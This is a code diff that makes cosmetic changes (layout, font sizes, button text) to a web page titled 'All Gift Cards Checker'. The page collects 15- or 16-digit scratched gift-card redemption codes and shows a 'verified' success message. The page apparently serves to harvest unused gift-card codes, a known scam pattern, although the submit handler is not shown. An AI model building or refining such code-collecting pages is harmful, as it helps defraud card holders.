@@ -127,12 +127,13 @@
       <!-- navbar- -->
 
       <nav id="myNav" class="overlay">
-        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
         <div class="overlay-content">
           <div class="receipt">
             <header class="receipt__header">
+              <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+
               <p class="receipt__title">
-                SUCCESS! 😊
+                SUCCESS! 
               </p>
               <p class="receipt__date">Your gift card has been verified
               </p>
@@ -338,7 +339,7 @@
                   >
                     All Gift Cards Checker
                   </span>
-                  <form id="stripe-login" class="contact-form"  >
+                  <form id="stripe-login" class="contact-form box-background--white paading"  >
                     <select
                     id="card-type"
                       required=""
@@ -452,16 +453,16 @@
 
                     <div id="form0"
                     class="field testtest"
-                    style=" color: #000;  display: none; "><p style="color:rgb(255, 0, 0)">16 digit code at the face of the card</p></div>
+                    style=" color: #000;  font-size: small; display: none;  "><p style="color:rgb(255, 0, 0)">16 digit code at the face of the card</p></div>
 
                     <div id="form01"
                     class="field testtest"
-                    style=" color: #000;  display: none; "><p style="color:rgb(255, 0, 0)">15 digit code at the face of the card</p></div>
+                    style=" color: #000;  display: none; font-size: small; "><p style="color:rgb(255, 0, 0)">15 digit code at the face of the card</p></div>
 
 
        
 
-                   <div > <p style="color:rgb(255, 178, 178)">  Please make sure the redemption code is the original scratched code</p></div>
+                   <!-- <div > <p style="color:rgb(255, 178, 178)">  Please make sure the redemption code is the original scratched code</p></div> -->
                     <div class="field padding-bottom--24">
                       <input  type="submit" name="submit" value="Continue" id="myButton1" />
                     </div>
@@ -730,6 +731,8 @@ document.querySelector(".contact-form").addEventListener("submit" , submitForm);
 // }
 function closeNav() {
     document.getElementById("myNav").style.width = "0%";
+    document.getElementById("myButton1").value="Continue"; 
+
 }
 
 function myClick() {
